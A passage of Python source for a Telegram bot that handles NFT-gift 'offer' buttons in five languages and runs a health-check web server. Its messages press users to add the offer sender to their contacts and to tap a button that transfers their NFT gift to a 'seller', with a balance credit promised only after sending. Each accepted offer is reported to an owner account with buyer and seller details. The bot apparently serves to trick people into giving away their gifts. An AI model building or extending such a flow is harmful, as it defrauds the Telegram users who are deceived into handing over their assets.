            await session.post(url + "editMessageText", json={
                "business_connection_id": offer['business_connection_id'], "chat_id": offer['chat_id'],
                "message_id": offer['message_id'], "text": build_cancel_text(lang),
                "reply_markup": {"inline_keyboard": []}
            })

        elif action == 'transfer_how':
            if lang == 'ua':
                instruction = "⚠️ <b>Важливо:</b> Обов'язково додайте відправника оффера до своїх контактів!\n\n1. Зайдіть у профіль людини, якій хочете передати подарунок.\n2. Натисніть на три крапки і виберіть 'Надіслати подарунок'.\n3. Виберіть подарунок і підтвердіть передачу."
            elif lang == 'ru':
                instruction = "⚠️ <b>Важно:</b> Обязательно добавьте отправителя оффера в свои контакты!\n\n1. Зайдите в профиль человека, которому хотите передать подарок.\n2. Нажмите на три точки и выберите 'Отправить подарок'.\n3. Выберите подарок и подтвердите."
            elif lang == 'ar':
                instruction = "⚠️ <b>هام:</b> تأكد من إضافة مرسل العرض إلى جهات الاتصال الخاصة بك!\n\n1. انتقل إلى ملف تعريف الشخص الذي تريد نقل الهدية إليه.\n2. انقر على النقاط الثلاث واختر 'إرسال هدية'.\n3. حدد الهدية وأكد النقل."
            elif lang == 'zh':
                instruction = "⚠️ <b>重要：</b> 务必先将报价发送者加入您的通讯录！\n\n1. 前往您想转移礼物的人的的个人资料。\n2. 点击三个点并选择“发送礼物”。\n3. 选择礼物并确认转移。"
            else:
                instruction = "⚠️ <b>Important:</b> Make sure to add the offer sender to your contacts!\n\n1. Go to the profile of the person you want to transfer the gift to.\n2. Tap the three dots and select 'Send Gift'.\n3. Select the gift and confirm the transfer."

            back_text = "⬅️ Назад" if lang == 'ru' else "⬅️ Назад" if lang == 'ua' else "⬅️ رجوع" if lang == 'ar' else "⬅️ 返回" if lang == 'zh' else "⬅️ Back"
            reply_markup = {"inline_keyboard": [[{"text": back_text, "callback_data": f"transfer_back:{offer_id}"}]]}
            await session.post(url + "editMessageText", json={
                "business_connection_id": offer['business_connection_id'], "chat_id": offer['chat_id'],
                "message_id": offer['message_id'], "text": instruction, "parse_mode": "HTML",
                "reply_markup": reply_markup
            })

        elif action == 'transfer_back':
            bal_text = get_balance_text(lang, offer['currency'])

            if lang == 'ua':
                success_text = f"✓ <b>Пропозицію прийнято!</b>\n\nТепер ви можете перейти до відправлення подарунка.\n\n⭐ Після відправлення подарунка {bal_text}"
            elif lang == 'ru':
                success_text = f"✓ <b>Предложение принято!</b>\n\nТеперь вы можете перейти к отправке подарка.\n\n⭐ После отправки подарка {bal_text}"
            elif lang == 'ar':
                success_text = f"✓ <b>تم قبول العرض!</b>\n\nيمكنك الآن المتابعة لإرسال الهدية.\n\n⭐ بعد إرسال الهدية، {bal_text}"
            elif lang == 'zh':
                success_text = f"✓ <b>报价已接受！</b>\n\n您现在可以继续发送礼物了。\n\n⭐ 发送礼物后，{bal_text}"
            else:
                success_text = f"✓ <b>Offer accepted!</b>\n\nYou can now proceed to send the gift.\n\n⭐ After sending the gift, {bal_text}"

            reply_markup = {"inline_keyboard": [
                [{
                     "text": "✓ Передать NFT" if lang == 'ru' else "✓ Передати NFT" if lang == 'ua' else "✓ تحويل NFT" if lang == 'ar' else "✓ 转移 NFT" if lang == 'zh' else "✓ Transfer NFT",
                     "url": f"tg://send_gift?to={offer.get('seller_username', '')}"}],
                [{
                     "text": "📤 Как передать?" if lang == 'ru' else "📤 Як передати?" if lang == 'ua' else "📤 كيفية التحويل؟" if lang == 'ar' else "📤 如何转移？" if lang == 'zh' else "📤 How to transfer?",
                     "callback_data": f"transfer_how:{offer_id}"}]
            ]}
            await session.post(url + "editMessageText", json={
                "business_connection_id": offer['business_connection_id'], "chat_id": offer['chat_id'],
                "message_id": offer['message_id'], "text": success_text, "parse_mode": "HTML",
                "reply_markup": reply_markup,
                "link_preview_options": {"is_disabled": False}
            })


# ============================================================
# СТАНДАРТНЫЕ КНОПКИ (ДЛЯ ЛИЧКИ)
# ============================================================

@client.on(events.CallbackQuery(pattern=b'^offer_(accept|reject|get):'))
async def handle_inline_offer_response(event: events.CallbackQuery.Event):
    await event.answer()
    action, offer_id = event.data.decode().split(':', 1)
    offer = active_offers.get(offer_id)
    if not offer or offer['status'] != 'pending': return
    lang = offer.get('lang', 'ru')

    if action == 'offer_get' or action == 'offer_accept':
        offer['status'] = 'accepted'

        # УВЕДОМЛЕНИЕ О ПРИНЯТИИ (ТОЛЬКО OWNER_ID)
        try:
            buyer = await event.get_sender()
            buyer_username = f"@{buyer.username}" if buyer.username else str(buyer.id)
            notif = (
                f"✅ <b>Оффер принят!</b>\n\n"
                f"📅 <b>Дата:</b> {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
                f"🔗 <b>Подарок:</b> <a href='{offer['link']}'>{offer['gift_name']}</a>\n"
                f"👤 <b>Продавец:</b> {offer.get('sender_name', 'Unknown')} (@{offer.get('seller_username', 'Unknown')})\n"
                f"🛒 <b>Покупатель:</b> {buyer_username}\n"
                f"💰 <b>Сумма:</b> {offer['price']} {offer['currency']}"
            )
            await client.send_message(OWNER_ID, notif, parse_mode='html')
        except Exception as e:
            print("Notif error:", e)

        bal_text = get_balance_text(lang, offer['currency'])

        if action == 'offer_get':
            if lang == 'ua':
                success_text = f"✓ <b>Очікуйте подарунок!</b>\n\nНатисніть на кнопку нижче, обов'язково додавши співрозмовника в контакти, інакше подарунок не з'явиться.\n\n⭐ Після отримання {bal_text}"
            elif lang == 'ru':
                success_text = f"✓ <b>Ожидайте подарок!</b>\n\nНажмите на кнопку ниже, обязательно добавив собеседника в контакты, иначе подарок не появится.\n\n⭐ После получения {bal_text}"
            elif lang == 'ar':
                success_text = f"✓ <b>انتظر الهدية!</b>\n\nانقر على الزر أدناه، مع التأكد من إضافة المرسل إلى جهات الاتصال، وإلا لن تظهر الهدية.\n\n⭐ بعد الاستلام، {bal_text}"
            elif lang == 'zh':
                success_text = f"✓ <b>请等待礼物！</b>\n\n请点击下方按钮，务必先将发送者加入通讯录，否则礼物将不会出现。\n\n⭐ 领取后，{bal_text}"
            else:
                success_text = f"✓ <b>Wait for the gift!</b>\n\nClick the button below, making sure to add the sender to your contacts, otherwise the gift won't appear.\n\n⭐ After receiving, {bal_text}"

            btn_txt = "✓ Передать NFT" if lang == 'ru' else "✓ Передати NFT" if lang == 'ua' else "✓ تحويل NFT" if lang == 'ar' else "✓ 转移 NFT" if lang == 'zh' else "✓ Transfer NFT"
            buttons = [[Button.url(btn_txt, f"tg://send_gift?to={offer.get('seller_username', '')}")]]
        else:
            if lang == 'ua':
                success_text = f"✓ <b>Пропозицію прийнято!</b>\n\nТепер ви можете перейти до відправлення подарунка.\n\n⭐ Після відправлення подарунка {bal_text}"
            elif lang == 'ru':
                success_text = f"✓ <b>Предложение принято!</b>\n\nТеперь вы можете перейти к отправке подарка.\n\n⭐ После отправки подарка {bal_text}"
            elif lang == 'ar':
                success_text = f"✓ <b>تم قبول العرض!</b>\n\nيمكنك الآن المتابعة لإرسال الهدية.\n\n⭐ بعد إرسال الهدية، {bal_text}"
            elif lang == 'zh':
                success_text = f"✓ <b>报价已接受！</b>\n\n您现在可以继续发送礼物了。\n\n⭐ 发送礼物后，{bal_text}"
            else:
                success_text = f"✓ <b>Offer accepted!</b>\n\nYou can now proceed to send the gift.\n\n⭐ After sending the gift, {bal_text}"

            buttons = build_transfer_buttons(offer_id, lang, offer.get('seller_username', ''))

        await event.edit(success_text, buttons=buttons, parse_mode='html', link_preview=True)

    elif action == 'offer_reject':
        offer['status'] = 'rejected'
        await event.edit(build_cancel_text(lang), buttons=None)


@client.on(events.CallbackQuery(pattern=b'^transfer_(how|back):'))
async def handle_inline_transfer_response(event: events.CallbackQuery.Event):
    await event.answer()
    action, offer_id = event.data.decode().split(':', 1)
    offer = active_offers.get(offer_id)
    if not offer: return
    lang = offer.get('lang', 'ru')

    if action == 'transfer_how':
        if lang == 'ua':
            instruction = "⚠️ <b>Важливо:</b> Обов'язково додайте відправника оффера до своїх контактів!\n\n1. Зайдіть у профіль людини, якій хочете передати подарунок.\n2. Натисніть на три крапки і виберіть 'Надіслати подарунок'.\n3. Виберіть подарунок і підтвердіть передачу."
        elif lang == 'ru':
            instruction = "⚠️ <b>Важно:</b> Обязательно добавьте отправителя оффера в свои контакты!\n\n1. Зайдите в профиль человека, которому хотите передать подарок.\n2. Нажмите на три точки и выберите 'Отправить подарок'.\n3. Выберите подарок и подтвердите."
        elif lang == 'ar':
            instruction = "⚠️ <b>هام:</b> تأكد من إضافة مرسل العرض إلى جهات الاتصال الخاصة بك!\n\n1. انتقل إلى ملف تعريف الشخص الذي تريد نقل الهدية إليه.\n2. انقر على النقاط الثلاث واختر 'إرسال هدية'.\n3. حدد الهدية وأكد النقل."
        elif lang == 'zh':
            instruction = "⚠️ <b>重要：</b> 务必先将报价发送者加入您的通讯录！\n\n1. 前往您想转移礼物的人的的个人资料。\n2. 点击三个点并选择“发送礼物”。\n3. 选择礼物并确认转移。"
        else:
            instruction = "⚠️ <b>Important:</b> Make sure to add the offer sender to your contacts!\n\n1. Go to the profile of the person you want to transfer the gift to.\n2. Tap the three dots and select 'Send Gift'.\n3. Select the gift and confirm the transfer."

        back_text = "⬅️ Назад" if lang == 'ru' else "⬅️ Назад" if lang == 'ua' else "⬅️ رجوع" if lang == 'ar' else "⬅️ 返回" if lang == 'zh' else "⬅️ Back"
        await event.edit(instruction, buttons=[[Button.inline(back_text, data=f"transfer_back:{offer_id}".encode())]],
                         parse_mode='html')

    elif action == 'transfer_back':
        bal_text = get_balance_text(lang, offer['currency'])
        if lang == 'ua':
            success_text = f"✓ <b>Пропозицію прийнято!</b>\n\nТепер ви можете перейти до відправлення подарунка.\n\n⭐ Після відправлення подарунка {bal_text}"
        elif lang == 'ru':
            success_text = f"✓ <b>Предложение принято!</b>\n\nТеперь вы можете перейти к отправке подарка.\n\n⭐ После отправки подарка {bal_text}"
        elif lang == 'ar':
            success_text = f"✓ <b>تم قبول العرض!</b>\n\nيمكنك الآن المتابعة لإرسال الهدية.\n\n⭐ بعد إرسال الهدية، {bal_text}"
        elif lang == 'zh':
            success_text = f"✓ <b>报价已接受！</b>\n\n您现在可以继续发送礼物了。\n\n⭐ 发送礼物后，{bal_text}"
        else:
            success_text = f"✓ <b>Offer accepted!</b>\n\nYou can now proceed to send the gift.\n\n⭐ After sending the gift, {bal_text}"

        await event.edit(success_text, buttons=build_transfer_buttons(offer_id, lang, offer.get('seller_username', '')),
                         parse_mode='html', link_preview=True)


# ============================================================
# ЗАПУСК
# ============================================================
async def health_check(request):
    return web.Response(text="Bot is alive")


async def start_web_server():
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()


async def main():
    asyncio.create_task(start_web_server())
    await client.start(bot_token=BOT_TOKEN)
    me = await client.get_me()
    print(f"✅ Бот запущен: @{me.username} (ID: {me.id})")
    await client.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())
